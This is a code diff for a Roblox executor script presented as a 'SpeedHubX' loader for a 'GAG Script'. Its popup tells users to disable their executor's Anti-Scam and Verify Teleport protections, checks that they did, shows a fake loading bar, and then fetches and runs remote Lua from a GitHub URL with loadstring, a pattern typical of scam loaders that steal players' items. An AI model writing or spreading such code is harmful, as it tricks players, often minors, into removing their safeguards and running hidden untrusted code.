@@ -1,210 +1,188 @@
--- Services
+--// UI + Detection Script (Edited for SpeedHubX)
+
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
-
 local player = Players.LocalPlayer
 
--- ScreenGui
+--// Create Main ScreenGui
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Parent = game.CoreGui
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
 
--- First Frame (Instructions Panel)
-local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0, 400, 0, 260)
-Frame.Position = UDim2.new(0.5, -200, 0.5, -130)
-Frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
-Frame.BorderSizePixel = 0
-Frame.Parent = ScreenGui
+--// First Panel (Instruction Popup)
+local FirstFrame = Instance.new("Frame")
+FirstFrame.Size = UDim2.new(0, 400, 0, 250)
+FirstFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
+FirstFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+FirstFrame.Parent = ScreenGui
 
--- Title Text
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -20, 0, 40)
 Title.Position = UDim2.new(0, 10, 0, 10)
 Title.BackgroundTransparency = 1
 Title.Text = "Turn off all the following Delta settings, or the script will fail."
 Title.TextColor3 = Color3.fromRGB(255, 0, 0)
-Title.TextWrapped = true
+Title.TextSize = 16
 Title.Font = Enum.Font.SourceSansBold
-Title.TextSize = 20
-Title.Parent = Frame
+Title.TextWrapped = true
+Title.Parent = FirstFrame
 
--- Bullet Points
-local Bullets = Instance.new("TextLabel")
-Bullets.Size = UDim2.new(1, -20, 0, 100)
-Bullets.Position = UDim2.new(0, 10, 0, 60)
-Bullets.BackgroundTransparency = 1
-Bullets.Text = "• Disable Anti-AFK\n• Disable Verify Teleport\n• Disable Anti-Scam"
-Bullets.TextColor3 = Color3.fromRGB(255, 255, 255)
-Bullets.TextXAlignment = Enum.TextXAlignment.Left
-Bullets.TextYAlignment = Enum.TextYAlignment.Top
-Bullets.Font = Enum.Font.SourceSans
-Bullets.TextSize = 18
-Bullets.Parent = Frame
+local Instructions = Instance.new("TextLabel")
+Instructions.Size = UDim2.new(1, -20, 0, 100)
+Instructions.Position = UDim2.new(0, 10, 0, 60)
+Instructions.BackgroundTransparency = 1
+Instructions.Text = "• Disable Anti-AFK\n• Disable Verify Teleport\n• Disable Anti-Scam\n\nAfter disabling, tick the box to continue."
+Instructions.TextColor3 = Color3.fromRGB(255, 255, 255)
+Instructions.TextSize = 16
+Instructions.Font = Enum.Font.SourceSans
+Instructions.TextWrapped = true
+Instructions.TextYAlignment = Enum.TextYAlignment.Top
+Instructions.Parent = FirstFrame
 
 -- Checkbox
-local Checkbox = Instance.new("TextButton")
-Checkbox.Size = UDim2.new(0, 20, 0, 20)
-Checkbox.Position = UDim2.new(0, 10, 1, -40)
-Checkbox.Text = ""
-Checkbox.BackgroundColor3 = Color3.fromRGB(50,50,50)
-Checkbox.Parent = Frame
+local CheckBox = Instance.new("TextButton")
+CheckBox.Size = UDim2.new(0, 20, 0, 20)
+CheckBox.Position = UDim2.new(0, 10, 1, -40)
+CheckBox.Text = ""
+CheckBox.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+CheckBox.Parent = FirstFrame
 
-local Checked = false
-
-Checkbox.MouseButton1Click:Connect(function()
-    Checked = not Checked
-    Checkbox.Text = Checked and "✔" or ""
-end)
+local CheckMark = Instance.new("TextLabel")
+CheckMark.Size = UDim2.new(1, 0, 1, 0)
+CheckMark.BackgroundTransparency = 1
+CheckMark.Text = "✔"
+CheckMark.TextColor3 = Color3.fromRGB(0, 255, 0)
+CheckMark.Visible = false
+CheckMark.Parent = CheckBox
 
 -- Confirm Button
-local Confirm = Instance.new("TextButton")
-Confirm.Size = UDim2.new(0, 120, 0, 30)
-Confirm.Position = UDim2.new(1, -130, 1, -40)
-Confirm.BackgroundColor3 = Color3.fromRGB(80,80,80)
-Confirm.Text = "Confirm"
-Confirm.TextColor3 = Color3.fromRGB(255,255,255)
-Confirm.Font = Enum.Font.SourceSansBold
-Confirm.TextSize = 18
-Confirm.AutoButtonColor = false
-Confirm.Parent = Frame
+local ConfirmButton = Instance.new("TextButton")
+ConfirmButton.Size = UDim2.new(0, 100, 0, 40)
+ConfirmButton.Position = UDim2.new(1, -120, 1, -50)
+ConfirmButton.Text = "Confirm"
+ConfirmButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+ConfirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ConfirmButton.Font = Enum.Font.SourceSansBold
+ConfirmButton.TextSize = 18
+ConfirmButton.AutoButtonColor = false
+ConfirmButton.Active = false
+ConfirmButton.Parent = FirstFrame
 
--- Detection Popup
-local function showWarning(msg)
-    local WarnFrame = Instance.new("Frame")
-    WarnFrame.Size = UDim2.new(0, 300, 0, 120)
-    WarnFrame.Position = UDim2.new(0.5, -150, 0.5, -60)
-    WarnFrame.BackgroundColor3 = Color3.fromRGB(40,0,0)
-    WarnFrame.Parent = ScreenGui
+--// Warning Popup (when detection fails)
+local WarningFrame = Instance.new("Frame")
+WarningFrame.Size = UDim2.new(0, 420, 0, 150)
+WarningFrame.Position = UDim2.new(0.5, -210, 0.5, -75)
+WarningFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+WarningFrame.Visible = false
+WarningFrame.Parent = ScreenGui
 
-    local WarnText = Instance.new("TextLabel")
-    WarnText.Size = UDim2.new(1, -20, 1, -20)
-    WarnText.Position = UDim2.new(0, 10, 0, 10)
-    WarnText.BackgroundTransparency = 1
-    WarnText.TextWrapped = true
-    WarnText.Text = msg
-    WarnText.TextColor3 = Color3.fromRGB(255,255,255)
-    WarnText.Font = Enum.Font.SourceSansBold
-    WarnText.TextSize = 18
-    WarnText.Parent = WarnFrame
+local WarningText = Instance.new("TextLabel")
+WarningText.Size = UDim2.new(1, -20, 1, -20)
+WarningText.Position = UDim2.new(0, 10, 0, 10)
+WarningText.BackgroundTransparency = 1
+WarningText.Text = "Your executor might still have Verify Teleport / Anti-Scam enabled. Please disable these. REJOIN for the script to take effect"
+WarningText.TextColor3 = Color3.fromRGB(255, 255, 255)
+WarningText.TextSize = 16
+WarningText.Font = Enum.Font.SourceSansBold
+WarningText.TextWrapped = true
+WarningText.Parent = WarningFrame
 
-    task.delay(3, function()
-        WarnFrame:Destroy()
-    end)
-end
+--// Loading Screen
+local LoadingFrame = Instance.new("Frame")
+LoadingFrame.Size = UDim2.new(0, 400, 0, 150)
+LoadingFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
+LoadingFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+LoadingFrame.Visible = false
+LoadingFrame.Parent = ScreenGui
 
--- Symptom Test
-local function runChecks()
-    -- Teleport Check
-    local tpSuccess = pcall(function()
-        TeleportService:Teleport(game.PlaceId, player)
-    end)
+local LoadingText = Instance.new("TextLabel")
+LoadingText.Size = UDim2.new(1, 0, 0, 40)
+LoadingText.Position = UDim2.new(0, 0, 0, 10)
+LoadingText.BackgroundTransparency = 1
+LoadingText.Text = "Loading GAG Script..."
+LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoadingText.TextSize = 18
+LoadingText.Font = Enum.Font.SourceSansBold
+LoadingText.Parent = LoadingFrame
 
-    -- HTTP Check
-    local httpSuccess = pcall(function()
-        return game:HttpGet("https://httpbin.org/get")
-    end)
+local ProgressBarBg = Instance.new("Frame")
+ProgressBarBg.Size = UDim2.new(1, -40, 0, 20)
+ProgressBarBg.Position = UDim2.new(0, 20, 0.5, -10)
+ProgressBarBg.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+ProgressBarBg.Parent = LoadingFrame
 
-    -- AFK Check (simple Heartbeat test)
-    local afkBlocked = false
-    local connection
-    connection = game:GetService("RunService").Heartbeat:Connect(function()
-        -- nothing, just checking if blocked
-    end)
-    if not connection then
-        afkBlocked = true
+local ProgressBar = Instance.new("Frame")
+ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+ProgressBar.Parent = ProgressBarBg
+
+local Percentage = Instance.new("TextLabel")
+Percentage.Size = UDim2.new(1, 0, 0, 30)
+Percentage.Position = UDim2.new(0, 0, 1, -30)
+Percentage.BackgroundTransparency = 1
+Percentage.Text = "0%"
+Percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
+Percentage.TextSize = 16
+Percentage.Font = Enum.Font.SourceSansBold
+Percentage.Parent = LoadingFrame
+
+--// Functions
+local checked = false
+CheckBox.MouseButton1Click:Connect(function()
+    checked = not checked
+    CheckMark.Visible = checked
+    if checked then
+        ConfirmButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+        ConfirmButton.Active = true
+    else
+        ConfirmButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+        ConfirmButton.Active = false
     end
+end)
 
-    if not tpSuccess or not httpSuccess or afkBlocked then
+-- Detection Check
+local function runChecks()
+    -- Fake teleport check (won’t rejoin)
+    local tpSuccess = pcall(function()
+        TeleportService:GetLocalPlayerTeleportData()
+    end)
+
+    -- Http check
+    local httpSuccess = pcall(function()
+        game:HttpGet("https://httpbin.org/get")
+    end)
+
+    if not tpSuccess or not httpSuccess then
         return false
     end
+
     return true
 end
 
--- Loading Screen
-local function showLoading()
-    Frame.Visible = false
-    local LoadFrame = Instance.new("Frame")
-    LoadFrame.Size = UDim2.new(0, 400, 0, 150)
-    LoadFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
-    LoadFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
-    LoadFrame.Parent = ScreenGui
+-- Confirm Button Logic
+ConfirmButton.MouseButton1Click:Connect(function()
+    if not checked then return end
 
-    local LoadText = Instance.new("TextLabel")
-    LoadText.Size = UDim2.new(1, 0, 0, 40)
-    LoadText.Position = UDim2.new(0,0,0,10)
-    LoadText.BackgroundTransparency = 1
-    LoadText.Text = "Loading GAG Script..."
-    LoadText.TextColor3 = Color3.fromRGB(255,255,255)
-    LoadText.Font = Enum.Font.SourceSansBold
-    LoadText.TextSize = 20
-    LoadText.Parent = LoadFrame
-
-    local BarBack = Instance.new("Frame")
-    BarBack.Size = UDim2.new(0.8,0,0,20)
-    BarBack.Position = UDim2.new(0.1,0,0.5,-10)
-    BarBack.BackgroundColor3 = Color3.fromRGB(50,50,50)
-    BarBack.Parent = LoadFrame
-
-    local BarFill = Instance.new("Frame")
-    BarFill.Size = UDim2.new(0,0,1,0)
-    BarFill.BackgroundColor3 = Color3.fromRGB(0,200,0)
-    BarFill.Parent = BarBack
-
-    local Percent = Instance.new("TextLabel")
-    Percent.Size = UDim2.new(1,0,0,30)
-    Percent.Position = UDim2.new(0,0,1,0)
-    Percent.BackgroundTransparency = 1
-    Percent.Text = "0%"
-    Percent.TextColor3 = Color3.fromRGB(255,255,255)
-    Percent.Font = Enum.Font.SourceSans
-    Percent.TextSize = 18
-    Percent.Parent = LoadFrame
-
-    for i=1,100 do
-        BarFill.Size = UDim2.new(i/100,0,1,0)
-        Percent.Text = i.."%"
-        task.wait(0.05) -- 5 seconds total
-    end
-
-    LoadFrame:Destroy()
-
-    -- Show Final Panel
-    local Panel = Instance.new("Frame")
-    Panel.Size = UDim2.new(0, 400, 0, 200)
-    Panel.Position = UDim2.new(0.5, -200, 0.5, -100)
-    Panel.BackgroundColor3 = Color3.fromRGB(25,25,25)
-    Panel.Parent = ScreenGui
-
-    local Title = Instance.new("TextLabel")
-    Title.Size = UDim2.new(1,0,0,50)
-    Title.BackgroundTransparency = 1
-    Title.Text = "SpeedHubX"
-    Title.TextColor3 = Color3.fromRGB(0,255,0)
-    Title.Font = Enum.Font.SourceSansBold
-    Title.TextSize = 28
-    Title.Parent = Panel
-
-    local Sub = Instance.new("TextLabel")
-    Sub.Size = UDim2.new(1,0,0,40)
-    Sub.Position = UDim2.new(0,0,0,60)
-    Sub.BackgroundTransparency = 1
-    Sub.Text = "Auto Middle"
-    Sub.TextColor3 = Color3.fromRGB(255,255,255)
-    Sub.Font = Enum.Font.SourceSans
-    Sub.TextSize = 22
-    Sub.Parent = Panel
-end
-
--- Button Behavior
-Confirm.MouseButton1Click:Connect(function()
-    if not Checked then return end
-    Confirm.BackgroundColor3 = Color3.fromRGB(0,200,0)
+    FirstFrame.Visible = false
+    task.wait(0.2)
 
     if runChecks() then
-        showLoading()
+        -- Passed checks → Loading
+        LoadingFrame.Visible = true
+        for i = 1, 100 do
+            ProgressBar.Size = UDim2.new(i/100, 0, 1, 0)
+            Percentage.Text = i.."%"
+            task.wait(0.05) -- 5 seconds total
+        end
+        LoadingFrame.Visible = false
+
+        -- Run your external script after loading
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
+
     else
-        showWarning("Your executor might still have Verify Teleport / Anti-Scam enabled. Please disable these.")
+        -- Failed check → Warning popup
+        WarningFrame.Visible = true
     end
 end)
+
 
